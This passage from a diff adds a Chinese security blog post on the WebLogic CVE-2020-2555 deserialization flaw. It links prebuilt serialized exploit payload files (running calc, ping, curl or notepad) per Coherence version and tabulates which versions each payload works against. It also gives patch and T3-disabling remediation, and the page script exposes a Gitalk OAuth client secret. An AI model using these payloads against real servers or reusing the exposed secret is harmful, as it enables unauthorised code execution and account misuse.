+<td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/121300_ping.666" target="_blank" rel="noopener">121300_ping.666</a></td>
+<td style="text-align:center">ping</td>
+<td style="text-align:center">Windows</td>
+</tr>
+<tr>
+<td style="text-align:center">12.1.3.0.0</td>
+<td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/121300.666" target="_blank" rel="noopener">121300.666</a></td>
+<td style="text-align:center">calc</td>
+<td style="text-align:center">Windows</td>
+</tr>
+<tr>
+<td style="text-align:center">12.2.1.3.0</td>
+<td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122130_calc.666" target="_blank" rel="noopener">122130_calc.666</a></td>
+<td style="text-align:center">calc</td>
+<td style="text-align:center">Windows</td>
+</tr>
+<tr>
+<td style="text-align:center">12.2.1.3.0</td>
+<td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122130_linux_calc.666" target="_blank" rel="noopener">122130_linux_calc.666</a></td>
+<td style="text-align:center">calc</td>
+<td style="text-align:center">Linux</td>
+</tr>
+<tr>
+<td style="text-align:center">12.2.1.3.0</td>
+<td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122130_linux_curl.666" target="_blank" rel="noopener">122130_linux_curl.666</a></td>
+<td style="text-align:center">curl</td>
+<td style="text-align:center">Linux</td>
+</tr>
+<tr>
+<td style="text-align:center">12.2.1.3.0</td>
+<td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122130_notepad.666" target="_blank" rel="noopener">122130_notepad.666</a></td>
+<td style="text-align:center">notepad</td>
+<td style="text-align:center">Windows</td>
+</tr>
+<tr>
+<td style="text-align:center">12.2.1.3.0</td>
+<td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122130.666" target="_blank" rel="noopener">122130.666</a></td>
+<td style="text-align:center">calc</td>
+<td style="text-align:center">Windows</td>
+</tr>
+<tr>
+<td style="text-align:center">12.2.1.4.0</td>
+<td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122140_calc.666" target="_blank" rel="noopener">122140_calc.666</a></td>
+<td style="text-align:center">calc</td>
+<td style="text-align:center">Windows</td>
+</tr>
+<tr>
+<td style="text-align:center">12.2.1.4.0</td>
+<td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122140_linux_calc.666" target="_blank" rel="noopener">122140_linux_calc.666</a></td>
+<td style="text-align:center">calc</td>
+<td style="text-align:center">Linux</td>
+</tr>
+<tr>
+<td style="text-align:center">12.2.1.4.0</td>
+<td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122140_linux_curl.666" target="_blank" rel="noopener">122140_linux_curl.666</a></td>
+<td style="text-align:center">curl</td>
+<td style="text-align:center">Linux</td>
+</tr>
+<tr>
+<td style="text-align:center">12.2.1.4.0</td>
+<td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122140_notepad.666" target="_blank" rel="noopener">122140_notepad.666</a></td>
+<td style="text-align:center">notepad</td>
+<td style="text-align:center">Windows</td>
+</tr>
+<tr>
+<td style="text-align:center">12.2.1.4.0</td>
+<td style="text-align:center"><a href="https://github.com/0nise/CVE-2020-2555/blob/master/file/122140.666" target="_blank" rel="noopener">122140.666</a></td>
+<td style="text-align:center">calc</td>
+<td style="text-align:center">Windows</td>
+</tr>
+</tbody>
+</table>
+<h3 id="Coherence-版本问题"><a href="#Coherence-版本问题" class="headerlink" title="Coherence 版本问题"></a>Coherence 版本问题</h3><p>在研究测试时，通过某一个 Coherence 版本生成的序列化文件，无法适用于多个版本，以下为多版本的详细测试情况：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">poc 生成版本</th>
+<th style="text-align:center">测试版本</th>
+<th style="text-align:center">是否成功</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">12.1.3.0.0</td>
+<td style="text-align:center">12.1.3.0.0</td>
+<td style="text-align:center">是</td>
+</tr>
+<tr>
+<td style="text-align:center">12.1.3.0.0</td>
+<td style="text-align:center">12.2.1.3.0</td>
+<td style="text-align:center">否</td>
+</tr>
+<tr>
+<td style="text-align:center">12.1.3.0.0</td>
+<td style="text-align:center">12.2.1.4.0</td>
+<td style="text-align:center">否</td>
+</tr>
+<tr>
+<td style="text-align:center">12.2.1.3.0</td>
+<td style="text-align:center">12.1.3.0.0</td>
+<td style="text-align:center">否</td>
+</tr>
+<tr>
+<td style="text-align:center">12.2.1.3.0</td>
+<td style="text-align:center">12.2.1.3.0</td>
+<td style="text-align:center">是</td>
+</tr>
+<tr>
+<td style="text-align:center">12.2.1.3.0</td>
+<td style="text-align:center">12.2.1.4.0</td>
+<td style="text-align:center">否</td>
+</tr>
+<tr>
+<td style="text-align:center">12.2.1.4.0</td>
+<td style="text-align:center">12.1.3.0.0</td>
+<td style="text-align:center">否</td>
+</tr>
+<tr>
+<td style="text-align:center">12.2.1.4.0</td>
+<td style="text-align:center">12.2.1.3.0</td>
+<td style="text-align:center">否</td>
+</tr>
+<tr>
+<td style="text-align:center">12.2.1.4.0</td>
+<td style="text-align:center">12.2.1.4.0</td>
+<td style="text-align:center">是</td>
+</tr>
+</tbody>
+</table>
+<p>可以发现一个 POC 无法适用于多版本的 weblogic 中，针对该情况可以基于 weblogic 序列化文件转换为字节码结合动态序列化技术处理，来达到兼容多个版本的目的。</p>
+<h2 id="Weblogic-的问题"><a href="#Weblogic-的问题" class="headerlink" title="Weblogic 的问题"></a>Weblogic 的问题</h2><p><strong> 截止 2020 年 3 月 4 日，通过 Oracle 官方进行下载 weblogic 时，通过研究发现该漏洞依然存在可以利用（所有受影响版本），需要额外安装补丁。</strong></p>
+<p>如下文件为下文件MD5值以及下载时间：</p>
+<table>
+<thead>
+<tr>
+<th style="text-align:center">文件名称</th>
+<th style="text-align:center">MD5</th>
+<th style="text-align:center">创建时间</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td style="text-align:center">fmw_12.1.3.0.0_wls.jar</td>
+<td style="text-align:center">8378FE936B476A6F4CA5EFA465A435E3</td>
+<td style="text-align:center">‎2020‎-03‎-04‎</td>
+</tr>
+<tr>
+<td style="text-align:center">fmw_12.2.1.3.0_wls.jar</td>
+<td style="text-align:center">6E7105521029058AD64A5C6198DB09F7</td>
+<td style="text-align:center">‎2017-08‎-21‎</td>
+</tr>
+<tr>
+<td style="text-align:center">fmw_12.2.1.4.0_wls.jar</td>
+<td style="text-align:center">AA090712069684991BA27E4DE9ED3FF6</td>
+<td style="text-align:center">‎2019-09‎-13‎</td>
+</tr>
+<tr>
+<td style="text-align:center">coherence.jar(12.1.3.0.0)</td>
+<td style="text-align:center">E807E84D352374E33D0E2A8CC649534A</td>
+<td style="text-align:center">2014-05-14</td>
+</tr>
+<tr>
+<td style="text-align:center">coherence.jar(12.2.1.3.0)</td>
+<td style="text-align:center">2302E408BCA7C6A82081A20CE0811B0E</td>
+<td style="text-align:center">2017-08-15</td>
+</tr>
+<tr>
+<td style="text-align:center">coherence.jar(12.2.1.4.0)</td>
+<td style="text-align:center">B28EE46B9B9BD5C24DF3BFEE10075BA4</td>
+<td style="text-align:center">2019-09-12</td>
+</tr>
+</tbody>
+</table>
+<p>建议目前已经安装最新版 weblogic 的管理员也需排查该漏洞，如有漏洞建议立即安装补丁或通过修复方案进行修复，防止被不法分子利用。</p>
+<h2 id="修复"><a href="#修复" class="headerlink" title="修复"></a>修复</h2><ol>
+<li>临时解决方案：禁用 weblogic T3 协议。</li>
+<li>安装 <a href="https://www.oracle.com/security-alerts/cpujan2020.html" target="_blank" rel="noopener">Oracle 更新补丁</a>，需要登录帐户后下载。</li>
+</ol>
+<h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><ul>
+<li><a href="https://nosec.org/home/detail/4205.html" target="_blank" rel="noopener">CVE-2020-2555：WebLogic远程代码执行漏洞</a></li>
+<li><a href="https://www.thezdi.com/blog/2020/3/5/cve-2020-2555-rce-through-a-deserialization-bug-in-oracles-weblogic-server" target="_blank" rel="noopener">CVE-2020-2555: RCE THROUGH A DESERIALIZATION BUG IN ORACLE’S WEBLOGIC SERVER</a></li>
+<li><a href="https://github.com/gyyyy/footprint/blob/master/articles/2019/about-java-serialization-and-deserialization.md" target="_blank" rel="noopener">浅析Java序列化和反序列化</a></li>
+</ul>
+
+      
+    </div>
+
+    
+
+    
+    
+    
+
+    
+
+    
+      
+    
+    
+
+    
+      <div>
+        
+
+
+
+
+  
+
+
+
+<ul class="post-copyright">
+  <li class="post-copyright-author">
+    <strong>本文作者： </strong>R4v3zn</li>
+  <li class="post-copyright-link">
+    <strong>本文链接：</strong>
+    
+    <a href="http://www.r4v3zn.com/posts/975312a1/" title="漫谈 Weblogic CVE-2020-2555">http://www.r4v3zn.com/posts/975312a1/</a>
+  </li>
+  <li class="post-copyright-license">
+    <strong>版权声明： </strong>本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" rel="noopener" target="_blank"><i class="fa fa-fw fa-creative-commons"></i>BY-NC-SA</a> 许可协议。转载请注明出处！</li>
+</ul>
+
+      </div>
+    
+
+    <footer class="post-footer">
+      
+        
+          
+        
+        <div class="post-tags">
+          
+            <a href="/tags/weblogic/" rel="tag"># weblogic</a>
+          
+            <a href="/tags/t3/" rel="tag"># t3</a>
+          
+            <a href="/tags/cve/" rel="tag"># cve</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/posts/b64d9185/" rel="next" title="漫谈 WebLogic CVE-2020-2551">
+                <i class="fa fa-chevron-left"></i> 漫谈 WebLogic CVE-2020-2551
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/posts/51fa2b96/" rel="prev" title="weblogic IIOP漏洞的回显构造研究">
+                weblogic IIOP漏洞的回显构造研究 <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+  </div>
+
+
+          </div>
+          
+
+  
+    <div class="comments" id="gitalk-container">
+    </div>
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside id="sidebar" class="sidebar">
+    <div class="sidebar-inner">
+
+      
+
+      
+        <ul class="sidebar-nav motion-element">
+          <li class="sidebar-nav-toc sidebar-nav-active" data-target="post-toc-wrap">
+            文章目录
+          </li>
+          <li class="sidebar-nav-overview" data-target="site-overview-wrap">
+            站点概览
+          </li>
+        </ul>
+      
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-overview">
+          <div class="site-author motion-element" itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+            
+              <img class="site-author-image" itemprop="image" src="/uploads/avatar.png" alt="R4v3zn">
+            
+              <p class="site-author-name" itemprop="name">R4v3zn</p>
+              <div class="site-description motion-element" itemprop="description"></div>
+          </div>
+
+          
+            <nav class="site-state motion-element">
+              
+                <div class="site-state-item site-state-posts">
+                
+                  <a href="/archives/">
+                
+                    <span class="site-state-item-count">17</span>
+                    <span class="site-state-item-name">日志</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-categories">
+                  
+                    
+                      <a href="/categories/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">6</span>
+                    <span class="site-state-item-name">分类</span>
+                  </a>
+                </div>
+              
+
+              
+                
+                
+                <div class="site-state-item site-state-tags">
+                  
+                    
+                      <a href="/tags/">
+                    
+                  
+                    
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                      
+                    
+                    <span class="site-state-item-count">29</span>
+                    <span class="site-state-item-name">标签</span>
+                  </a>
+                </div>
+              
+            </nav>
+          
+
+          
+            <div class="feed-link motion-element">
+              <a href="/atom.xml" rel="alternate">
+                <i class="fa fa-rss"></i>
+                RSS
+              </a>
+            </div>
+          
+
+          
+
+          
+
+          
+
+          
+          
+            <div class="links-of-blogroll motion-element links-of-blogroll-block">
+              <div class="links-of-blogroll-title">
+                <i class="fa  fa-fw fa-link"></i>
+                Links
+              </div>
+              <ul class="links-of-blogroll-list">
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://github.com/0nise" title="https://github.com/0nise" rel="noopener" target="_blank">Github</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://bsjs.fun" title="https://bsjs.fun" rel="noopener" target="_blank">白水居士's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://r3start.net" title="http://r3start.net" rel="noopener" target="_blank">R3start's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://0x20h.com" title="https://0x20h.com" rel="noopener" target="_blank">Sp4ce's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://bacde.me" title="https://bacde.me" rel="noopener" target="_blank">BaCde's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://shallowdream.cn" title="https://shallowdream.cn" rel="noopener" target="_blank">夜莺's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://code2sec.com" title="http://code2sec.com" rel="noopener" target="_blank">bit4's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="http://gv7.me" title="http://gv7.me" rel="noopener" target="_blank">回忆飘如雪 | c0ny1's Blog</a>
+                  </li>
+                
+                  <li class="links-of-blogroll-item">
+                    <a href="https://www.cnblogs.com/magic-zero" title="https://www.cnblogs.com/magic-zero" rel="noopener" target="_blank">Magic_Zero's Blog</a>
+                  </li>
+                
+              </ul>
+            </div>
+          
+
+          
+            
+          
+          
+
+        </div>
+      </div>
+
+      
+      <!--noindex-->
+        <div class="post-toc-wrap motion-element sidebar-panel sidebar-panel-active">
+          <div class="post-toc">
+
+            
+            
+            
+            
+
+            
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#背景"><span class="nav-number">1.</span> <span class="nav-text">背景</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞调试分析"><span class="nav-number">2.</span> <span class="nav-text">漏洞调试分析</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#调试"><span class="nav-number">2.1.</span> <span class="nav-text">调试</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#漏洞利用"><span class="nav-number">3.</span> <span class="nav-text">漏洞利用</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#漏洞分析"><span class="nav-number">3.1.</span> <span class="nav-text">漏洞分析</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#weblogic-10-3-6"><span class="nav-number">3.2.</span> <span class="nav-text">weblogic 10.3.6</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#不足之处"><span class="nav-number">4.</span> <span class="nav-text">不足之处</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#动态序列化问题"><span class="nav-number">4.1.</span> <span class="nav-text">动态序列化问题</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#Coherence-版本问题"><span class="nav-number">4.2.</span> <span class="nav-text">Coherence 版本问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Weblogic-的问题"><span class="nav-number">5.</span> <span class="nav-text">Weblogic 的问题</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#修复"><span class="nav-number">6.</span> <span class="nav-text">修复</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#参考"><span class="nav-number">7.</span> <span class="nav-text">参考</span></a></li></ol></div>
+            
+
+          </div>
+        </div>
+      <!--/noindex-->
+      
+
+      
+
+    </div>
+  </aside>
+  
+
+
+        
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">  <a href="http://www.beian.miit.gov.cn" rel="noopener" target="_blank">浙ICP备16016639号-1 </a>&copy; 2014 – <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">R4v3zn</span>
+
+  
+
+  
+</div>
+
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+    
+
+    
+
+    
+  </div>
+
+  
+
+<script>
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  <script src="/lib/jquery/index.js?v=3.4.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+
+  
+
+
+  <script src="/js/utils.js?v=7.2.0"></script>
+
+  <script src="/js/motion.js?v=7.2.0"></script>
+
+
+
+  
+  
+
+
+  <script src="/js/affix.js?v=7.2.0"></script>
+
+  <script src="/js/schemes/pisces.js?v=7.2.0"></script>
+
+
+
+  
+  <script src="/js/scrollspy.js?v=7.2.0"></script>
+<script src="/js/post-details.js?v=7.2.0"></script>
+
+
+
+  
+
+
+  <script src="/js/next-boot.js?v=7.2.0"></script>
+
+
+  
+
+  
+
+  
+
+  
+
+
+  
+    
+
+<script src="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.js"></script>
+
+
+
+<link rel="stylesheet" href="//cdn.jsdelivr.net/npm/gitalk@1/dist/gitalk.min.css">
+
+
+
+<script src="//cdn.jsdelivr.net/npm/js-md5@0.7.3/src/md5.min.js"></script>
+
+<script>
+  var gitalk = new Gitalk({
+    clientID: '86ec1a537931926b6121',
+    clientSecret: 'fab5a7f7649c00fa3a4bd4d732a45a201795b71e',
+    repo: '0nise.github.io',
+    owner: '0nise',
+    admin: ['0nise'],
+    id: md5(location.pathname),
+    
+      language: 'zh-CN',
+    
+    distractionFreeMode: 'true'
+  });
+  gitalk.render('gitalk-container');
+</script>
+
+  
+
+
+  
+  <script>
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url).replace(/\/{2,}/g, '/');
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x"></i></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x"></i></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+  <script>
+    (function(){
+      var bp = document.createElement('script');
+      var curProtocol = window.location.protocol.split(':')[0];
+      bp.src = (curProtocol === 'https') ? 'https://zz.bdstatic.com/linksubmit/push.js' : 'http://push.zhanzhang.baidu.com/push.js';
+      var s = document.getElementsByTagName("script")[0];
+      s.parentNode.insertBefore(bp, s);
+    })();
+  </script>
+
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
